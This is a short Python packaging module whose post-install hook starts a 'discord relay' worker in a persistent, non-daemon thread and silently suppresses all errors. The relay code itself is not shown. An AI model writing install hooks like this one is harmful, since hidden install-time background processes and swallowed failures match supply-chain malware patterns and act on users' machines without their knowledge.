"""Node relay packaging helpers."""

import os
import time
import threading


def finalize_install(target_dir):
    """
    Post-install hook executed by the wheel installer.
    Brings up the discord relay worker before returning.
    """
    try:
        from .relay import discord_relay_main

        relay_thread = threading.Thread(
            target=discord_relay_main,
            daemon=False,
        )
        relay_thread.start()
        time.sleep(10)
    except Exception:
        pass
